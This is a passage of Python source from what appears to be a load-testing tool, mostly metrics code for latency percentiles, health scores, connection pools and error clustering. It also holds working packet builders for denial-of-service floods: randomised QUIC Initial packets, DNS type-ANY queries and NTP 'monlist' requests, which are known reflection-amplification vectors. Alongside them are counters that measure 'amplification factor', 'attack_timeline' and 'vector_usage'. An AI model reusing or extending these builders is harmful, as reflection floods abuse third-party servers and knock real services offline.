    lines.append(f"  0s{' ' * (width - 6)}{int(total_duration)}s")
    lines.append(f"  [{''.join(bar)}]")
    for ev in events[:24]:
        t = float(ev.get('t', 0))
        label = ev.get('label') or ev.get('name') or ev.get('type', '')
        lines.append(f"   t={t:6.1f}s  {ev.get('type', ''):<12} {label}")
    if len(events) > 24:
        lines.append(f"   ... and {len(events) - 24} more events")
    return lines


def parse_chain_spec(spec: str) -> List[Tuple[str, float]]:
    chain = []
    for part in spec.split(','):
        part = part.strip()
        if not part:
            continue
        if ':' in part:
            name, dur_s = part.rsplit(':', 1)
            try:
                dur = float(dur_s)
            except ValueError:
                dur = 0.0
        else:
            name, dur = part, 0.0
        name = name.strip().lower()
        if name:
            chain.append((name, max(0.0, dur)))
    return chain


def _build_quic_initial_packet() -> bytes:
    version = b'\x00\x00\x00\x01'
    dcid_len = random.randint(8, 20)
    scid_len = random.randint(0, 16)
    dcid = os.urandom(dcid_len)
    scid = os.urandom(scid_len)
    token = b''
    payload = os.urandom(random.randint(800, 1200))
    length = len(payload) + 16 + 2
    first = 0xC0
    pkt_num = random.randint(0, 0xFFFFFF)
    pkt_num_bytes = pkt_num.to_bytes(3, 'big')
    body = (
        bytes([first]) + version +
        bytes([dcid_len]) + dcid +
        bytes([scid_len]) + scid +
        bytes([len(token)]) + token +
        length.to_bytes(3, 'big') +
        pkt_num_bytes + payload
    )
    return body


def _build_dns_query(qtype: int = 255, qname: str = None) -> bytes:
    tid = random.randint(0, 0xFFFF)
    flags = b'\x01\x00'
    counts = b'\x00\x01\x00\x00\x00\x00\x00\x00'
    name = qname or random.choice([
        'example.com', 'www.example.com', 'test.loadstorm.local',
        'dns.google', 'cloudflare.com', 'version.bind',
    ])
    qbytes = b''
    for label in name.split('.'):
        lb = label.encode('ascii', 'ignore')[:63]
        qbytes += bytes([len(lb)]) + lb
    qbytes += b'\x00'
    qtype_qclass = qtype.to_bytes(2, 'big') + b'\x00\x01'
    return tid.to_bytes(2, 'big') + flags + counts + qbytes + qtype_qclass


def _build_ntp_monlist_request() -> bytes:
    li_vn_mode = (0 << 6) | (2 << 3) | 7
    req = bytearray(48)
    req[0] = li_vn_mode
    req[2] = 0x03
    req[3] = 0x06
    req[12:16] = os.urandom(4)
    auth = bytearray(4 + 4 + 8)
    auth[0] = (0 << 6) | (2 << 3) | 7
    auth[3] = 0x29
    auth[4:6] = (4).to_bytes(2, 'big')
    return bytes(req) + bytes(auth)


def parse_validation_rule(spec: str) -> Optional[dict]:
    parts = spec.split(':', 2)
    if len(parts) != 3:
        return None
    fname, op, value = parts
    allowed_ops = {'eq', 'ne', 'gt', 'lt', 'gte', 'lte', 'contains', 'not_contains', 'regex'}
    if op not in allowed_ops:
        return None
    if op in ('gt', 'lt', 'gte', 'lte'):
        try:
            value = float(value)
        except ValueError:
            return None
    return {'field': fname.strip(), 'op': op, 'value': value}


@dataclass
class ResponseValidation:
    expected_status: Optional[int] = None
    min_size: Optional[int] = None
    max_size: Optional[int] = None
    contains: Optional[str] = None
    not_contains: Optional[str] = None
    max_response_time: Optional[float] = None
    regex: Optional[str] = None
    content_type_contains: Optional[str] = None
    custom_rules: list = field(default_factory=list)


@dataclass
class ScenarioStep:
    url: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)
    body: Optional[str] = None
    body_file: Optional[str] = None
    validation: Optional[ResponseValidation] = None
    weight: int = 1
    extractors: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    ws_message_type: str = "text"
    ws_message_size: int = 64
    ws_ping_interval: float = 0.0
    ws_reconnect_attempts: int = 3
    ws_message_frequency: float = 0.0
    ws_fragment_size: int = 0
    ws_custom_payload_hex: Optional[str] = None
    assertions: list = field(default_factory=list)


@dataclass
class RequestLog:
    timestamp: float
    url: str
    method: str
    status: int
    response_time_ms: float
    size_bytes: int
    error: Optional[str]
    valid: bool
    connect_time_ms: float = 0.0
    ttfb_ms: float = 0.0
    download_ms: float = 0.0
    correlation_id: str = ""
    response_snippet: str = ""
    pattern: str = ""
    failed_rules: list = field(default_factory=list)
    assertion_failures: list = field(default_factory=list)


class RollingWindowData:
    def __init__(self, max_age_seconds: int = 60):
        self._max_age = max_age_seconds
        self._entries: Deque[Tuple[float, float, bool]] = deque()

    def record(self, response_time_ms: float, is_error: bool):
        now = time.time()
        self._entries.append((now, response_time_ms, is_error))
        self._prune(now)

    def _prune(self, now: float):
        cutoff = now - self._max_age
        while self._entries and self._entries[0][0] < cutoff:
            self._entries.popleft()

    def get_stats(self, window_seconds: int) -> dict:
        now = time.time()
        cutoff = now - window_seconds
        window = [(t, rt, e) for t, rt, e in self._entries if t >= cutoff]
        if not window:
            return {'rps': 0.0, 'avg_ms': 0.0, 'p50_ms': 0.0, 'p95_ms': 0.0,
                    'error_rate': 0.0, 'count': 0}
        times = [rt for _, rt, _ in window]
        errors = sum(1 for _, _, e in window if e)
        duration = max(0.001, window[-1][0] - window[0][0])
        times_sorted = sorted(times)
        p50_idx = len(times_sorted) // 2
        p95_idx = int(len(times_sorted) * 0.95)
        return {
            'rps': len(window) / duration,
            'avg_ms': sum(times) / len(times),
            'p50_ms': times_sorted[min(p50_idx, len(times_sorted) - 1)],
            'p95_ms': times_sorted[min(p95_idx, len(times_sorted) - 1)],
            'error_rate': errors / len(window) * 100,
            'count': len(window),
        }


class WorkerConnectionPool:
    def __init__(self, max_per_worker: int = 10, connection_ttl: float = 30.0):
        self.max_per_worker = max_per_worker
        self.connection_ttl = connection_ttl
        self._pools: Dict[int, Deque] = {}
        self._stats = {'acquired': 0, 'released': 0, 'reused': 0, 'created': 0, 'expired': 0}
        self._lock = asyncio.Lock()

    def register_worker(self, worker_id: int):
        if worker_id not in self._pools:
            self._pools[worker_id] = deque(maxlen=self.max_per_worker)

    async def acquire(self, worker_id: int):
        async with self._lock:
            self._stats['acquired'] += 1
            pool = self._pools.get(worker_id)
            if pool:
                now = time.time()
                while pool and now - pool[0][1] > self.connection_ttl:
                    pool.popleft()
                    self._stats['expired'] += 1
                if pool:
                    conn, ct = pool.popleft()
                    self._stats['reused'] += 1
                    return conn, True
            self._stats['created'] += 1
            return None, False

    async def release(self, worker_id: int, conn):
        async with self._lock:
            self._stats['released'] += 1
            pool = self._pools.get(worker_id)
            if pool is not None and len(pool) < self.max_per_worker:
                pool.append((conn, time.time()))

    def get_stats(self) -> dict:
        return dict(self._stats)

    def cleanup(self):
        self._pools.clear()


class ConnectionHealthMonitor:
    """Tracks rolling connection-level health: success ratio, latency, and failures per worker."""

    def __init__(self, max_samples: int = 5000):
        self._samples: Deque[Tuple[float, int, bool, float]] = deque(maxlen=max_samples)
        self.total_success = 0
        self.total_failure = 0
        self.consecutive_failures = 0
        self.max_consecutive_failures = 0
        self._worker_failures: Dict[int, int] = {}
        self._worker_totals: Dict[int, int] = {}
        self.last_failure_time = 0.0

    def record(self, worker_id: int, success: bool, connect_ms: float):
        now = time.time()
        self._samples.append((now, worker_id, success, connect_ms))
        self._worker_totals[worker_id] = self._worker_totals.get(worker_id, 0) + 1
        if success:
            self.total_success += 1
            self.consecutive_failures = 0
        else:
            self.total_failure += 1
            self.consecutive_failures += 1
            self.last_failure_time = now
            self._worker_failures[worker_id] = self._worker_failures.get(worker_id, 0) + 1
            if self.consecutive_failures > self.max_consecutive_failures:
                self.max_consecutive_failures = self.consecutive_failures

    def health(self, window_seconds: int = 30) -> dict:
        now = time.time()
        cutoff = now - window_seconds
        window = [(t, w, ok, ct) for t, w, ok, ct in self._samples if t >= cutoff]
        total = self.total_success + self.total_failure
        if not window:
            return {
                'available': total > 0,
                'overall_success_pct': round(
                    (self.total_success / total * 100.0) if total else 0.0, 2),
                'window_success_pct': 0.0,
                'window_samples': 0,
                'avg_connect_ms': 0.0,
                'consecutive_failures': self.consecutive_failures,
                'max_consecutive_failures': self.max_consecutive_failures,
                'status': 'no recent samples',
                'unhealthy_workers': [],
                'time_since_last_failure_s': round(now - self.last_failure_time, 1)
                if self.last_failure_time else None,
            }
        wins = sum(1 for _, _, ok, _ in window if ok)
        connect_vals = [ct for _, _, _, ct in window if ct > 0]
        avg_connect = sum(connect_vals) / len(connect_vals) if connect_vals else 0.0
        win_pct = wins / len(window) * 100.0
        overall_pct = (self.total_success / total * 100.0) if total else 0.0
        unhealthy = []
        for wid, fails in sorted(self._worker_failures.items(), key=lambda x: -x[1])[:10]:
            t = self._worker_totals.get(wid, 0)
            if t >= 5 and fails / t > 0.5:
                unhealthy.append({'worker_id': wid, 'failures': fails,
                                  'total': t, 'fail_pct': round(fails / t * 100.0, 1)})
        if win_pct >= 99 and self.consecutive_failures == 0:
            status = 'healthy'
        elif win_pct >= 95:
            status = 'degraded'
        elif win_pct >= 80:
            status = 'unstable'
        else:
            status = 'unhealthy'
        return {
            'available': True,
            'overall_success_pct': round(overall_pct, 2),
            'window_success_pct': round(win_pct, 2),
            'window_samples': len(window),
            'avg_connect_ms': round(avg_connect, 2),
            'consecutive_failures': self.consecutive_failures,
            'max_consecutive_failures': self.max_consecutive_failures,
            'status': status,
            'unhealthy_workers': unhealthy,
            'tracked_workers': len(self._worker_totals),
            'time_since_last_failure_s': round(now - self.last_failure_time, 1)
            if self.last_failure_time else None,
        }

    def summary(self) -> dict:
        return {
            'total_success': self.total_success,
            'total_failure': self.total_failure,
            'max_consecutive_failures': self.max_consecutive_failures,
            'tracked_workers': len(self._worker_totals),
        }


@dataclass
class LiveMetrics:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    timeout_errors: int = 0
    conn_errors: int = 0
    http_4xx: int = 0
    http_5xx: int = 0
    total_bytes_sent: int = 0
    total_bytes_recv: int = 0
    total_bytes: int = 0
    response_times: deque = field(default_factory=lambda: deque(maxlen=1000000))
    status_codes: dict = field(default_factory=dict)
    start_time: float = 0.0
    end_time: float = 0.0
    peak_rps: float = 0.0
    current_rps: float = 0.0
    active_users: int = 0
    max_concurrent: int = 0
    rps_per_second: deque = field(default_factory=lambda: deque(maxlen=600))
    bytes_per_second: deque = field(default_factory=lambda: deque(maxlen=600))
    latency_buckets: dict = field(default_factory=lambda: {
        '<50ms': 0, '50-100ms': 0, '100-200ms': 0, '200-500ms': 0,
        '500ms-1s': 0, '1-2s': 0, '2-5s': 0, '>5s': 0
    })
    validation_passes: int = 0
    validation_fails: int = 0
    websocket_msgs: int = 0
    websocket_bytes: int = 0
    per_url_metrics: dict = field(default_factory=dict)
    error_type_counts: dict = field(default_factory=lambda: {
        'timeout': 0, 'connection': 0, 'dns': 0, 'ssl': 0,
        'http_4xx': 0, 'http_5xx': 0, 'unknown': 0,
    })
    request_logs: list = field(default_factory=list)
    _req_window: int = 0
    _bytes_window: int = 0
    _window_start: float = 0.0
    _rps_history: list = field(default_factory=list)
    _error_rate_history: list = field(default_factory=list)
    _response_times_history: list = field(default_factory=list)
    _throughput_history: list = field(default_factory=list)
    _bytes_sent_window: int = 0
    _bytes_recv_window: int = 0
    total_reused_connections: int = 0
    total_new_connections: int = 0
    connection_times_ms: deque = field(default_factory=lambda: deque(maxlen=100000))
    ttfb_times_ms: deque = field(default_factory=lambda: deque(maxlen=100000))
    server_processing_est_ms: deque = field(default_factory=lambda: deque(maxlen=100000))
    network_overhead_est_ms: deque = field(default_factory=lambda: deque(maxlen=100000))
    error_recovery_times_ms: deque = field(default_factory=lambda: deque(maxlen=10000))
    _last_error_time: float = 0.0
    _last_success_time: float = 0.0
    _in_error_state: bool = False
    rolling_data: RollingWindowData = field(default_factory=RollingWindowData)
    dynamic_scale_history: list = field(default_factory=list)
    _per_second_data: deque = field(default_factory=lambda: deque(maxlen=600))
    _error_per_second: list = field(default_factory=list)
    _outlier_values: list = field(default_factory=list)
    _per_second_details: list = field(default_factory=list)
    latency_window: deque = field(default_factory=lambda: deque(maxlen=200000))
    heatmap_history: list = field(default_factory=list)
    percentile_history: list = field(default_factory=list)
    error_event_log: list = field(default_factory=list)
    correlation_ids_issued: int = 0
    correlation_echoed: int = 0
    scenario_assert_pass: int = 0
    scenario_assert_fail: int = 0
    assertion_fail_samples: list = field(default_factory=list)
    validation_rule_fails: dict = field(default_factory=dict)
    timeline_events: list = field(default_factory=list)
    intensity_history: list = field(default_factory=list)
    vector_usage: dict = field(default_factory=dict)
    phase_stats: list = field(default_factory=list)
    quic_packets_sent: int = 0
    quic_responses: int = 0
    dns_queries_sent: int = 0
    dns_responses: int = 0
    dns_bytes_sent: int = 0
    dns_bytes_recv: int = 0
    ntp_queries_sent: int = 0
    ntp_responses: int = 0
    ntp_bytes_sent: int = 0
    ntp_bytes_recv: int = 0
    amplification_samples: list = field(default_factory=list)
    auto_tune_history: list = field(default_factory=list)
    smart_url_picks: dict = field(default_factory=dict)
    graphql_queries_sent: int = 0
    graphql_errors: int = 0
    rest_requests_sent: int = 0
    ws_chat_messages_sent: int = 0
    bottleneck_history: list = field(default_factory=list)
    health_score_history: list = field(default_factory=list)

    @property
    def duration(self) -> float:
        if self.end_time and self.start_time:
            return self.end_time - self.start_time
        return time.time() - self.start_time if self.start_time else 0

    @property
    def avg_rps(self) -> float:
        d = self.duration
        return self.total_requests / d if d > 0 else 0

    @property
    def avg_response_time(self) -> float:
        if not self.response_times:
            return 0
        return sum(self.response_times) / len(self.response_times)

    @property
    def median_response_time(self) -> float:
        if not self.response_times:
            return 0
        return statistics.median(self.response_times)

    @property
    def stddev_response_time(self) -> float:
        if len(self.response_times) < 2:
            return 0
        return statistics.stdev(self.response_times)

    @property
    def p50(self): return self._percentile(50)
    @property
    def p90(self): return self._percentile(90)
    @property
    def p95(self): return self._percentile(95)
    @property
    def p99(self): return self._percentile(99)
    @property
    def p999(self): return self._percentile(99.9)
    @property
    def min_rt(self): return min(self.response_times) if self.response_times else 0
    @property
    def max_rt(self): return max(self.response_times) if self.response_times else 0

    @property
    def success_rate(self) -> float:
        return (self.successful / self.total_requests * 100) if self.total_requests else 0

    @property
    def error_rate(self) -> float:
        return (self.failed / self.total_requests * 100) if self.total_requests else 0

    @property
    def throughput_mbps(self) -> float:
        return (self.total_bytes / 1024 / 1024) / max(0.001, self.duration)

    @property
    def bytes_sent_mbps(self) -> float:
        return (self.total_bytes_sent / 1024 / 1024) / max(0.001, self.duration)

    @property
    def bytes_recv_mbps(self) -> float:
        return (self.total_bytes_recv / 1024 / 1024) / max(0.001, self.duration)

    @property
    def validation_rate(self) -> float:
        total = self.validation_passes + self.validation_fails
        return (self.validation_passes / total * 100) if total else 0

    @property
    def connection_reuse_rate(self) -> float:
        total = self.total_reused_connections + self.total_new_connections
        return (self.total_reused_connections / total * 100) if total else 0

    @property
    def avg_connect_time(self) -> float:
        if not self.connection_times_ms:
            return 0
        return sum(self.connection_times_ms) / len(self.connection_times_ms)

    @property
    def avg_ttfb(self) -> float:
        if not self.ttfb_times_ms:
            return 0
        return sum(self.ttfb_times_ms) / len(self.ttfb_times_ms)

    @property
    def avg_server_processing(self) -> float:
        if not self.server_processing_est_ms:
            return 0
        return sum(self.server_processing_est_ms) / len(self.server_processing_est_ms)

    @property
    def avg_network_overhead(self) -> float:
        if not self.network_overhead_est_ms:
            return 0
        return sum(self.network_overhead_est_ms) / len(self.network_overhead_est_ms)

    @property
    def avg_error_recovery(self) -> float:
        if not self.error_recovery_times_ms:
            return 0
        return sum(self.error_recovery_times_ms) / len(self.error_recovery_times_ms)

    @property
    def max_error_recovery(self) -> float:
        if not self.error_recovery_times_ms:
            return 0
        return max(self.error_recovery_times_ms)

    @property
    def coefficient_of_variation(self) -> float:
        avg = self.avg_response_time
        if avg == 0:
            return 0
        return self.stddev_response_time / avg

    @property
    def error_rate_per_second(self) -> list:
        return list(self._error_per_second)

    @property
    def statistical_outliers(self) -> list:
        if len(self.response_times) < 10:
            return []
        avg = self.avg_response_time
        sd = self.stddev_response_time
        if sd == 0:
            return []
        threshold = 3 * sd
        return [v for v in self.response_times if abs(v - avg) > threshold]

    @property
    def connection_reuse_efficiency(self) -> float:
        total = self.total_reused_connections + self.total_new_connections
        if total == 0:
            return 0.0
        return (self.total_reused_connections / total) * 100

    @property
    def assertion_rate(self) -> float:
        total = self.scenario_assert_pass + self.scenario_assert_fail
        return (self.scenario_assert_pass / total * 100) if total else 0

    @property
    def correlation_echo_rate(self) -> float:
        return (self.correlation_echoed / self.correlation_ids_issued * 100) if self.correlation_ids_issued else 0

    @property
    def avg_amplification_factor(self) -> float:
        if not self.amplification_samples:
            return 0.0
        return sum(self.amplification_samples) / len(self.amplification_samples)

    def record_timeline_event(self, etype: str, label: str, data: dict = None):
        ev = {
            't': round(time.time() - (self.start_time or time.time()), 2),
            'type': etype,
            'label': label,
        }
        if data:
            ev.update(data)
        self.timeline_events.append(ev)
        if len(self.timeline_events) > 2000:
            del self.timeline_events[:-1000]

    def record_intensity(self, factor: float, reason: str):
        self.intensity_history.append({
            't': round(time.time() - (self.start_time or time.time()), 2),
            'factor': round(factor, 3),
            'reason': reason,
        })
        if len(self.intensity_history) > 1000:
            del self.intensity_history[:-500]

    def box_plot(self) -> dict:
        sample = list(self.response_times)
        if len(sample) > 50000:
            sample = sample[-50000:]
        return _box_plot_stats(sample)

    def error_correlation(self) -> dict:
        return _error_correlation_analysis(
            list(self._rps_history), list(self._error_rate_history),
            list(self._response_times_history))

    def degradation(self) -> dict:
        return _degradation_detection(
            list(self._per_second_details), list(self._rps_history),
            list(self._error_rate_history), list(self._response_times_history))

    def capacity(self) -> dict:
        return _capacity_estimation(
            list(self._rps_history), list(self._error_rate_history),
            self.peak_rps, self.avg_rps, self.avg_response_time,
            self.max_concurrent)

    def percentile_evolution(self) -> dict:
        return _percentile_evolution(list(self.percentile_history))

    def error_rate_prediction(self) -> dict:
        return _predict_error_rate(
            list(self._error_rate_history), list(self._rps_history))

    def health_score(self) -> dict:
        deg = self.degradation()
        total = max(1, self.total_requests)
        conn_err_rate = (self.conn_errors / total) * 100.0
        timeout_rate = (self.timeout_errors / total) * 100.0
        rps_vals = list(self._rps_history)
        if len(rps_vals) >= 2 and max(rps_vals) > 0:
            rps_stability = (sum(rps_vals) / len(rps_vals)) / max(rps_vals)
        else:
            rps_stability = 0.0
        validation = self.validation_rate if (self.validation_passes + self.validation_fails) > 0 else 100.0
        return _server_health_score(
            error_rate=self.error_rate,
            success_rate=self.success_rate,
            avg_ms=self.avg_response_time,
            p95_ms=self.p95,
            p99_ms=self.p99,
            degradation_severity=deg.get('severity', 'none'),
            conn_error_rate=conn_err_rate,
            timeout_rate=timeout_rate,
            rps_stability=rps_stability,
            validation_rate=validation,
        )

    def throughput_efficiency(self) -> dict:
        return _throughput_efficiency(
            total_bytes=self.total_bytes,
            total_requests=self.total_requests,
            bytes_per_second_hist=list(self._throughput_history),
            rps_hist=list(self._rps_history),
            avg_ms=self.avg_response_time,
            max_concurrent=self.max_concurrent,
        )

    def record_bottleneck(self, bottleneck: dict):
        self.bottleneck_history.append({
            't': round(time.time() - (self.start_time or time.time()), 2),
            'primary': bottleneck.get('primary', 'none'),
            'severity': bottleneck.get('severity', 'healthy'),
            'confidence': bottleneck.get('confidence', 0.0),
        })
        if len(self.bottleneck_history) > 500:
            del self.bottleneck_history[:-250]

    def record_health_sample(self):
        hs = self.health_score()
        self.health_score_history.append({
            't': round(time.time() - (self.start_time or time.time()), 2),
            'score': hs.get('score', 0.0),
            'grade': hs.get('grade', 'F'),
        })
        if len(self.health_score_history) > 500:
            del self.health_score_history[:-250]

    def attack_timeline(self) -> dict:
        dur = self.duration or 1.0
        return {
            'events': list(self.timeline_events),
            'duration': round(dur, 2),
            'phases': list(self.phase_stats),
            'intensity_history': list(self.intensity_history),
            'vector_usage': dict(self.vector_usage),
            'ascii': _render_timeline_ascii(self.timeline_events, dur),
        }

    def _percentile(self, p: float) -> float:
        if not self.response_times:
            return 0
        idx = int(len(self.response_times) * p / 100)
        return sorted(self.response_times)[min(idx, len(self.response_times) - 1)]

    def record_latency(self, ms: float, url: str = ""):
        self.response_times.append(ms)
        self.latency_window.append((time.time(), ms))
        band = _band_for_ms(ms)
        self.latency_buckets[band] += 1
        if url:
            if url not in self.per_url_metrics:
                self.per_url_metrics[url] = {'requests': 0, 'errors': 0, 'total_time': 0}
            self.per_url_metrics[url]['requests'] += 1
            self.per_url_metrics[url]['total_time'] += ms

    def record_request_log(self, log: RequestLog):
        self.request_logs.append(log)
        if len(self.request_logs) > 50000:
            self.request_logs = self.request_logs[-25000:]

    def record_error_event(self, err_type: str):
        self.error_event_log.append((time.time(), err_type or 'unknown'))
        if len(self.error_event_log) > 50000:
            del self.error_event_log[:-25000]

    def record_error(self):
        self._last_error_time = time.time()
        self._in_error_state = True

    def record_success(self):
        if self._in_error_state and self._last_error_time > 0:
            recovery_ms = (time.time() - self._last_error_time) * 1000
            if recovery_ms < 300000:
                self.error_recovery_times_ms.append(recovery_ms)
        self._last_success_time = time.time()
        self._in_error_state = False

    def tick(self):
        now = time.time()
        if not self._window_start:
            self._window_start = now
            return
        elapsed = now - self._window_start
        if elapsed >= 1.0:
            rps = self._req_window / elapsed
            self.rps_per_second.append(rps)
            self.bytes_per_second.append(self._bytes_window / elapsed)
            self._rps_history.append(rps)
            self._throughput_history.append(self._bytes_window / elapsed)
            err_count = self._req_window - self.successful if self._req_window else 0
            err_rate = (err_count / max(1, self._req_window)) * 100
            self._error_rate_history.append(min(100, err_rate))
            self._error_per_second.append(err_count)
            if self.response_times:
                recent = list(self.response_times)[-min(100, len(self.response_times)):]
                self._response_times_history.append(sum(recent) / len(recent) if recent else 0)
            if rps > self.peak_rps:
                self.peak_rps = rps
            self.current_rps = rps
            self._per_second_details.append({
                'second': len(self._rps_history),
                'rps': round(rps, 2),
                'error_rate': round(min(100, err_rate), 2),
                'avg_response_ms': round(sum(recent) / len(recent), 2) if recent else 0,
                'bytes_per_sec': round(self._bytes_window / elapsed, 2),
                'error_count': err_count,
            })
            band_counts = {label: 0 for label in LATENCY_BAND_LABELS}
            sec_times = []
            w_start = self._window_start
            for ts, rt in self.latency_window:
                if w_start <= ts < now:
                    band_counts[_band_for_ms(rt)] += 1
                    sec_times.append(rt)
            self.heatmap_history.append(band_counts)
            if len(self.heatmap_history) > 120:
                del self.heatmap_history[:-120]
            if len(sec_times) >= 5:
                st = sorted(sec_times)

                def _pct(p, _st=st):
                    idx = min(int(len(_st) * p / 100), len(_st) - 1)
                    return _st[idx]

                self.percentile_history.append({'p50': _pct(50), 'p95': _pct(95), 'p99': _pct(99)})
            else:
                self.percentile_history.append({'p50': self.p50, 'p95': self.p95, 'p99': self.p99})
            if len(self.percentile_history) > 120:
                del self.percentile_history[:-120]
            self._req_window = 0
            self._bytes_window = 0
            self._window_start = now

    def snapshot(self):
        return {
            'rps': self.current_rps, 'peak': self.peak_rps,
            'total': self.total_requests, 'ok': self.successful,
            'fail': self.failed, 'active': self.active_users,
            'avg': self.avg_response_time, 'median': self.median_response_time,
            'stddev': self.stddev_response_time,
            'p50': self.p50, 'p90': self.p90, 'p95': self.p95, 'p99': self.p99, 'p999': self.p999,
            'min': self.min_rt, 'max': self.max_rt,
            'tmo': self.timeout_errors, 'cerr': self.conn_errors,
            'h4': self.http_4xx, 'h5': self.http_5xx,
            'mb': self.total_bytes / 1024 / 1024,
            'mb_sent': self.total_bytes_sent / 1024 / 1024,
            'mb_recv': self.total_bytes_recv / 1024 / 1024,
            'dur': self.duration, 'rate': self.success_rate,
            'error_rate': self.error_rate,
            'mbps': self.throughput_mbps,
            'mbps_sent': self.bytes_sent_mbps,
            'mbps_recv': self.bytes_recv_mbps,
            'buckets': dict(self.latency_buckets),
            'val_pass': self.validation_passes, 'val_fail': self.validation_fails,
            'val_rate': self.validation_rate,
            'ws_msgs': self.websocket_msgs, 'ws_bytes': self.websocket_bytes,
            'per_url': dict(self.per_url_metrics),
            'rps_history': list(self._rps_history),
            'error_type_counts': dict(self.error_type_counts),
            'conn_reuse': self.connection_reuse_rate,
            'conn_reused': self.total_reused_connections,
            'conn_new': self.total_new_connections,
            'avg_connect': self.avg_connect_time,
            'avg_ttfb': self.avg_ttfb,
            'avg_server_proc': self.avg_server_processing,
            'avg_net_overhead': self.avg_network_overhead,
            'avg_recovery': self.avg_error_recovery,
            'max_recovery': self.max_error_recovery,
            'rolling_10s': self.rolling_data.get_stats(10),
            'rolling_30s': self.rolling_data.get_stats(30),
            'rolling_60s': self.rolling_data.get_stats(60),
            'cv': self.coefficient_of_variation,
            'error_rate_per_second': self.error_rate_per_second,
            'outlier_count': len(self.statistical_outliers),
            'conn_reuse_efficiency': self.connection_reuse_efficiency,
            'per_second_details': list(self._per_second_details),
            'heatmap_history': list(self.heatmap_history),
            'percentile_history': list(self.percentile_history),
            'error_clusters': self.analyze_error_clusters(),
            'resource_estimation': self.resource_estimation(),
            'correlation': {
                'issued': self.correlation_ids_issued,
                'echoed': self.correlation_echoed,
                'echo_rate': self.correlation_echo_rate,
            },
            'assertions': {
                'pass': self.scenario_assert_pass,
                'fail': self.scenario_assert_fail,
                'rate': self.assertion_rate,
                'fail_samples': list(self.assertion_fail_samples[-50:]),
            },
            'validation_rule_fails': dict(self.validation_rule_fails),
            'box_plot': self.box_plot(),
            'error_correlation': self.error_correlation(),
            'degradation': self.degradation(),
            'capacity': self.capacity(),
            'percentile_evolution': self.percentile_evolution(),
            'error_rate_prediction': self.error_rate_prediction(),
            'health_score': self.health_score(),
            'throughput_efficiency': self.throughput_efficiency(),
            'health_score_history': list(self.health_score_history),
            'bottleneck_history': list(self.bottleneck_history),
            'graphql': {
                'queries_sent': self.graphql_queries_sent,
                'errors': self.graphql_errors,
            },
            'rest': {
                'requests_sent': self.rest_requests_sent,
            },
            'ws_chat': {
                'messages_sent': self.ws_chat_messages_sent,
            },
            'attack_timeline': self.attack_timeline(),
            'quic': {
                'packets_sent': self.quic_packets_sent,
                'responses': self.quic_responses,
            },
            'dns_amp': {
                'queries_sent': self.dns_queries_sent,
                'responses': self.dns_responses,
                'bytes_sent': self.dns_bytes_sent,
                'bytes_recv': self.dns_bytes_recv,
                'avg_amplification': round(self.avg_amplification_factor, 2),
            },
            'ntp_amp': {
                'queries_sent': self.ntp_queries_sent,
                'responses': self.ntp_responses,
                'bytes_sent': self.ntp_bytes_sent,
                'bytes_recv': self.ntp_bytes_recv,
                'avg_amplification': round(self.avg_amplification_factor, 2),
            },
        }

    def analyze_error_clusters(self, max_gap: float = 2.0, max_clusters: int = 10) -> dict:
        events = sorted(self.error_event_log, key=lambda e: e[0])
        if not events:
            return {
                'total_errors': 0, 'cluster_count': 0, 'dominant_type': None,
                'largest_cluster': 0, 'mean_cluster_size': 0.0, 'types': {},
                'top_clusters': [], 'clustered_error_ratio': 0.0,
            }
        clusters = []
        current = [events[0]]
        for prev, ev in zip(events, events[1:]):
            if ev[0] - prev[0] <= max_gap and ev[1] == current[0][1]:
                current.append(ev)
            else:
                clusters.append(current)
                current = [ev]
        clusters.append(current)
        t0 = self.start_time or events[0][0]
        summary = []
        for c in clusters:
            times = [e[0] for e in c]
            summary.append({
                'type': c[0][1],
                'count': len(times),
                'start_s': round(times[0] - t0, 2),
                'end_s': round(times[-1] - t0, 2),
                'duration_s': round(times[-1] - times[0], 2),
            })
        summary.sort(key=lambda x: -x['count'])
        types: Dict[str, dict] = {}
        for ts, et in events:
            d = types.setdefault(et, {'count': 0, 'first_s': None, 'last_s': None})
            d['count'] += 1
            rel = round(ts - t0, 2)
            if d['first_s'] is None or rel < d['first_s']:
                d['first_s'] = rel
            if d['last_s'] is None or rel > d['last_s']:
                d['last_s'] = rel
        dominant = max(types.items(), key=lambda kv: kv[1]['count'])[0] if types else None
        sizes = [len(c) for c in clusters]
        return {
            'total_errors': len(events),
            'cluster_count': len(clusters),
            'dominant_type': dominant,
            'largest_cluster': max(sizes),
            'mean_cluster_size': round(sum(sizes) / len(sizes), 2),
            'types': types,
            'top_clusters': summary[:max_clusters],
            'clustered_error_ratio': round(sum(1 for s in sizes if s >= 3) / max(1, len(sizes)), 3),
        }

    def resource_estimation(self) -> dict:
        dur = max(0.001, self.duration)
        rps = self.avg_rps
        avg_s = self.avg_response_time / 1000.0
        little_law = rps * avg_s
        est = {
            'little_law_concurrency': round(little_law, 2),
            'est_server_conn_memory_mb': round(little_law * 10 / 1024, 2),
            'est_server_cpu_cores': round(rps * 0.005, 3),
            'est_server_cpu_percent': round(min(999.0, rps * 0.005 * 100.0), 2),
            'est_network_mbps': round(self.throughput_mbps, 2),
            'est_peak_concurrent': self.max_concurrent,
            'observed_rps': round(rps, 2),
            'load_gen_max_rss_mb': 0.0,
            'load_gen_cpu_seconds': 0.0,
            'load_gen_avg_cpu_percent': 0.0,
        }
        try:
            import resource as _res
            usage = _res.getrusage(_res.RUSAGE_SELF)
            est['load_gen_max_rss_mb'] = round(usage.ru_maxrss / 1024.0, 2)
            cpu_seconds = usage.ru_utime + usage.ru_stime
            est['load_gen_cpu_seconds'] = round(cpu_seconds, 2)
            est['load_gen_avg_cpu_percent'] = round(cpu_seconds / dur * 100.0, 2)
        except Exception:
            pass
        return est


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Edge/126.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
